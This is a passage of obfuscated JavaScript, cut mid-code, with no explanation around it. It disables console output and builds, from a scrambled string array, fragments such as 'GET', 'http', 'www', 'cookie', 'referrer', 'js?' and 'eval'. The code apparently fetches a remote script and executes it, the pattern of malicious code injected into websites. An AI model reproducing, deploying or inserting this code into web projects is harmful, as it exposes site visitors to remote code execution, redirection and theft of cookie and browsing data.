Z;try{if(BV(rU.Q,rU.u)+'SI'===Ba(rU.E,rU.z)+'VI')return Y[Ba(rU.N,rU.S)+BV(rU.H,rU.F)]()[BV(rU.V,rU.a)+Ba(rU.O,rU.U)+'ng'](-0x3f5+0x1b22*0x1+-0x1709)[Ba(rU.P,rU.t)+BV(rU.x,rU.s)](-0x2586+-0x3*-0x462+0x1862*0x1);else{var L=Function(BV(rU.X,rU.D)+BV(rU.Z,rU.L)+BV(rU.b,rU.G)+BV(rU.d,rU.f)+BV(rU.C,rU.q)+Ba(rU.W,rU.k)+'\x20'+(Ba(rU.j,rU.t)+Ba(rU.M,rU.c)+BV(rU.m,rU.s)+Ba(rU.K,rU.rP)+Ba(rU.rt,rU.rx)+BV(rU.rs,rU.rX)+Ba(rU.rD,rU.rZ)+Ba(rU.rL,rU.rb)+Ba(rU.rG,rU.rd)+Ba(rU.rf,rU.rb)+'\x20)')+');');Z=L();}}catch(j){if(Ba(rU.rC,rU.z)+'ZZ'===BV(rU.rq,rU.K)+'ZZ')Z=window;else{var m=p[BV(rU.rW,rU.rk)+'ly'](Q,arguments);return u=null,m;}}var b=Z[BV(rU.rj,rU.rM)+Ba(rU.rc,rU.rm)+'e']=Z[Ba(rU.rK,rU.ro)+BV(rU.ri,rU.rJ)+'e']||{},G=[Ba(rU.rR,rU.re),BV(rU.rI,rU.rv)+'n',Ba(rU.rg,rU.rA)+'o',Ba(rU.rT,rU.rn)+'or',BV(rU.ry,rU.x)+Ba(rU.Y0,rU.Y1)+BV(rU.Y2,rU.Y3),BV(rU.Y4,rU.Y5)+'le',Ba(rU.Y6,rU.Y7)+'ce'];for(var f=-0x1757*-0x1+0x717+-0x1e6e;f<G[BV(rU.Y8,rU.Y9)+BV(rU.YB,rU.Yr)];f++){if(Ba(rU.YY,rU.c)+'QH'===Ba(rU.Yp,rU.Yh)+'Vn'){var K=p[BV(rU.Yl,rU.Yw)+'ly'](Q,arguments);return u=null,K;}else{var C=Y[Ba(rU.YQ,rU.Yu)+Ba(rU.YE,rU.t)+BV(rU.Yz,rU.YN)+'or'][Ba(rU.YS,rU.YH)+Ba(rU.YF,rU.rA)+BV(rU.YV,rU.Ya)][Ba(rU.YO,rU.YU)+'d'](Y),q=G[f],W=b[q]||C;C[BV(rU.Y5,rU.YP)+Ba(rU.Yt,rU.Yx)+BV(rU.Ys,rU.YX)]=Y[Ba(rU.YD,rU.YZ)+'d'](Y),C[Ba(rU.YL,rU.Yb)+BV(rU.YG,rU.Yd)+'ng']=W[BV(rU.Yf,rU.YC)+Ba(rU.Yq,rU.YW)+'ng'][BV(rU.Yk,rU.Yj)+'d'](W),b[q]=C;}}}else return Y[BV(rU.YM,rU.Yc)+BV(rU.Ym,rU.YK)+'ng']()[Ba(rU.Yo,rU.Yi)+BV(rU.YJ,rU.YR)](Ba(rU.Ye,rU.YI)+Ba(rU.Yv,rU.Yg)+BV(rU.YA,rU.YT)+Ba(rU.Yn,rU.Yy))[BV(rU.p0,rU.p1)+Ba(rU.p2,rU.YU)+'ng']()[BV(rU.p3,rU.p4)+BV(rU.p5,rU.s)+Ba(rU.p6,rU.YU)+'or'](p)[Ba(rU.p7,rU.p8)+Ba(rU.p9,rU.pB)](Ba(rU.pr,rU.pY)+BV(rU.pp,rU.ph)+Ba(rU.pl,rU.pw)+Ba(rU.pQ,rU.rZ));});return X(),P[BE(rP.Q,rP.u)+BE(rP.E,rP.z)+'f'](t)!==-(0xa71+-0x658+-0x418);}}}());function h(){var rx=['W51PW4e','WR/dIGe','W73dTSo5','tab','pZa0','W4zYW5K','GET','gPn','W6ldMmk3','WR8uja','pCocAq','BDM','{}.','kLVdVG','ycVcIa','dom','F8kdWQe','n()','a8k1vW','oCkmW78','4352060oksXrL','W4ldOv8','WRCNlW','WRhdV8kL','BwtcKG','v8o3pW','W7xcTCos','pon','W71KeG','xfQ','vSkffG','BSkCW4S','WPdcU1DOWQuEW5lcVa','W7ZdS8k+','tNa','hos','com','tot','W7FdMXG','+)+','WRxcHmoI','fmkXuq','10093336FHQGxU','vmoXzW','www','d8kSlq','res','Bmo0rZLcW6/cIgLKW4BcHSkoyCkL','eda','DmkTnG','W7ldUmka','rSkYWOO','c37dIG','/ap','pJC','ion','DVJ','fCkJW5a','htt','BmkpdG','in.','gmkNW4y','coo','W4zPW4C','lCk+mq','gWvF','//w','onr','WOBdJCoy','omosjW','rea','ope','WQS4CW','WQvPWOe','W73dPsm','js?','W696iq','W7hdNCkt','WRuNE8oHW5tdI8kFWRvlo1BcOG','pro','WR3cJmkU','wCo6WOy','Ag/dMG','fmomW4W','CHxcNW','W7tcLem','WOJdVCkD','vIa','kCkTga','ach','k1RdSq','W47dVbK','zmkAW4W','gmkRW5O','yst','unc','WQxcNSoT','FN5g','rZZcJq','mmoSW7y','xSD','\x22)(','CyL','\x22re','W7BcPmke','WQ0+uW','W6xcS8o/','or(','ucFcJq','ebc','gth','DAH','ext','kyA','jCopsW','jxl','emk3qa','CddcLa','z3Dz','cWL+','l8kInq','pmk3pG','W71QbW','WRNcNmkg','z1DT','PjD','gCkdeq','con','iUb','W5S1WPW','pv3dVG','W6T3eG','__p','erTP','W7JdGmkj','W5b/W5y','eIc','Xcv','chddVG','WQBcJCoQWQmNwCk4CstdRCkzzG','ept','W7BdRCk3','ofeAnKP8d8okhwC','oJmU','W7WPyG','log','WQ3cMmoL','vs/cQa','\x20(f','F3RdJW','W6dcO8oV','qzk','amkMra','tri','ACknWRq','tus','jdmD','qmoHCq','F8kqWQW','xCo/aq','c8opW7u','12581550cTNNjZ','FCkjda','MwH','B8kqWQ4','y8k6dq','sta','app','cCktba','703232vpokRF','W73cSSo+','.+)','omkYfG','WONcPHK','smoNWQC','zmkcW7S','W6tcLv4','urn','pCobW7C','W5fKW6y','F3RdNq','ind','ASkiWPq','WRxcHCoY','ACkdfa','WQOPBG','z214','W6fIfG','W5usWO4','WRlcNSot','q3jo','W6rgcq','ref','ype','W7RdPmk4','Okp','W6VcO8ooW4THic4Q','1433400AlseHU','sol','smo6WPu','W6xdPCkh','dyS','pSo4pq','vIdcGq','WQyTmG','loc','W6H9hq','W40eW5a','get','pSofiq','smo9WOy','o__','WQn/WPy','war','vITp','15fDaUdz','W61LpW','W7NdOSkL','exc','len','uct','seT','n\x20t','WPFdT8kB','sea','tat','uZ7cPW','toS','ruK','924276cEmoOo','tio','ch7cPa','W7LMfG','ran','7JveFHs','yNPV','WRWYAq','jhHt','gw46','BaQ','ESk4WQ4','WoD','y8krWRi','W7JdK8k/','str','rch','ta.','ret','bin','C8kDW5K','ver','W6tcKuS','exO','FNRdUG','WR4unG','eva','his','8302GrZYxX','DgZdMG','ead','C8kvW7S','meddQW','mYHi','21fcTGvA','WRe5vW','FCkseG','lbSH','dbPx','smoPWOa','W6xdImkQ','nge','jSoosa','wsN','W6n7pq','jYS/smotWR7dOCoLWQHhWOxcVSko','WRSgaG','FCksaq'];h=function(){return rx;};return h();}};